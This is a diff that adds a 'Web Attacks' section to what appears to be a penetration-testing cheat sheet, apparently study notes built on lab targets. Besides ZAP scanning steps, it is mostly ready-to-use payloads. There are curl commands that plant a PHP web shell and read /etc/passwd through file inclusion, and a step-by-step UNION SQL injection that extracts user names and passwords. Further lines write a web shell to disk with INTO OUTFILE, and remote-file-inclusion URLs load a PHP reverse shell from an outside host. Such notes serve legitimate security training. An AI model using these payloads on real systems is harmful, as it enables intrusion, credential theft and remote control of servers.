@@ -514,3 +514,116 @@ The local machine connects to a remote host 1.1.1.1 and proxies its traffic thru
     ssh -D 8080 root@1.1.1.1
     proxychains nmap -p 22,80,222,10000 -sT -Pn 2.2.2.2
 
+<div id="Web Attacks"> <h3>10. Web Attacks</h3></div>
+
+
+<h4>ZAP</h4>
+
+Mapping and Scanning (unauthenticated)
+
+    1. Browse  Site Using ZAP, check all normal functionalities
+    2. Go to root directory, right click, spider 
+    3. Right Click Active Scan, Show Advanced, select applicable technologies and OS, run
+
+Authentication 
+
+    1. Right click add to new context
+    2. Session Management (most likely will be cookie based) 
+    3. Go to the Web app and Authenticate
+    4. Check Session Tree and look for a POST to the login form, right click and then select “Flag as context”, Form Based Authentication Request. 
+    5. Select Username and Password parameter from the dropdown 
+    6. Go back to the session three, look for the POST to the login form again, check the response tab and look for a “logged in indicator” in the HTML source code and then right click, flag as context, logged in indicator. 
+    7. Add Users under the context “users” tab
+    8. Right Click on the index page, attack, then spider, select the user from the drop down. 
+    9. Rick Click on the context, active scan, select the user from the drop down 
+
+<h4>General Tips</h4>
+
+    Review Source Code
+    Review Response Headers 
+    CMS: Review CMS type, version, manual and default admin credentials
+
+<h4>Command Injection </h4>
+
+    curl "https://1.1.1.1/<?php echo shell_exec($_GET['cmd']);?>"
+
+    curl "https://1.1.1.1/%3C%3Fphp%20echo%20shell_exec%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E"
+
+    curl "https://1.1.1.1/section.php?cmd=cat%20/etc/passwd&page=../../../../../proc/self/fd/10%00"
+
+<h4>SQL Injection </h4>
+
+
+Vulnerable URL/Parameter: 
+
+    http://1.1.1.1/mvc/Product.aspx?Id=1
+
+<h5>1. Enumerate if vulnerable</h5>
+
+    id=1' 
+
+<h5>2. Enumerate DB Number of colums </h5>
+
+    id=1 order by 1
+    id=1 order by 2
+    ...
+    id=1 order by 9 
+
+    id=1 union all select 1,2,3,4,5,6,7,8
+
+<h5>3. Enumerate DB Version </h5>
+
+    id=-1 UNION SELECT version(),2,3,4,5,6,7,8
+
+<h5>4. Enumerate DB User </h5>
+
+    id=99999 UNION SELECT user(),2,3,4,5,6,7,8
+
+<h5>5. Enumerate DB Name </h5>
+
+    id=1=2 UNION SELECT database(),2,3,4,5,6,7,8
+
+<h5>6. Enumerate Table Names </h5>
+
+    id=0 and 1=2 UNION SELECT table_name,2,3,4,5,6,7,8 from information_schema.tables where table_schema='bricks'
+
+<h5>7. Enumerate Table Users </h5>
+
+    id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 0,1 -- -
+    ... 
+    id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 7,1 -- -
+
+<h5>8. Extract Name and Password </h5>
+
+    id=0 and 1=2 UNION SELECT concat(name,CHAR(32),password),2,3,4,5,6,7,8 from bricks.users LIMIT 0,1 -- -
+    ...  
+    id=0 and 1=2 UNION SELECT concat(name,CHAR(32),password),2,3,4,5,6,7,8 from bricks.users LIMIT 7,1 -- -
+
+<h5>9. SQL to Command Injection </h5>
+
+    id=0 'UNION ALL SELECT 1,2,3,4,5,"<?php echo shell_exec($_GET[\"cmd\"]);?>" into OUTFILE "/var/www/html/rax.php”
+    id=0 'UNION ALL SELECT "<?php echo shell_exec($_GET[\"cmd\"]);?>",2,3,4,5,6 into OUTFILE "c:/xampp/htdocs/rax.php" #;
+
+<h4>RFI</h4>
+
+     http://1.1.1.1/index.php?slogin_path=http://10.11.0.105/php-reverse-shell.txt?
+    http://1.1.1.1/index.php?slogin_path=http://10.11.0.105/php-reverse-shell.txt%00
+
+Other Resources 
+
+<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MSSQL%20Injection.md">MSSQL Injection</a>
+
+<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">Pentest Monkey MySQL Injection Cheat Sheet</a>
+
+<a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">Pentest Monkey MSSQL Injection Cheat Sheet</a>
+
+<div id="LessonsLearned"> <h3>11. Lessons Learned</h3></div>
+
+Things to keep in mind
+<ul>
+  <li>Always Review Source Code</li>
+  <li>Check Sudo Version </li>
+  <li>In most cases RFI vulns can be used as LFIs too</li>
+  <li>In most cases LFIs can be used to read arbitrary files on the system. </li>
+</ul>
+ 
